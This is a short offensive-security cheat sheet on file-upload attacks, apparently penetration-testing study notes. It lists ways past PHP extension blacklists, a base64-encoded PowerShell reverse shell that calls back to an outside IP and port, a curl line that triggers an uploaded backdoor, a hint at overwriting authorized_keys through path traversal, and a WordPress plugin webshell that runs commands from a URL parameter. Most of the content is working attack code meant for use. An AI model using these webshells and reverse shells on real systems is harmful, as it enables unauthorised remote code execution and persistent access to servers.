# File Upload

**Bypassing extension blacklists:**
- Alternate PHP extensions: `.php7`, `.phar`, `.phtml`, `.phps`
- Mixed case: `pHp`, `pHTml`

**Exploitation steps:**
1. Upload a PHP webshell
2. Base64-encode the reverse shell payload (avoids special character issues)

**PowerShell reverse shell via base64:**
```powershell
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);...'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText = [Convert]::ToBase64String($Bytes)
$EncodedText
```
Execute: `powershell -enc $EncodedText`

**Curl trigger (URL-encoded enc payload):**
```bash
curl http://<target>/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20<BASE64>
```

**Overriding authorized_keys via path traversal + file upload:**
The target username is determined by which user's home directory the file lands in.

---

## WordPress Plugin Webshell

Create a plugin zip containing:
```php
<?php
/**
 * Plugin Name: Simple Webshell
 * Description: A minimal WordPress webshell
 * Version: 1.0
 */
echo system($_GET[cmd]);
?>
```
Upload through WP Admin → Plugins → Add New → Upload.
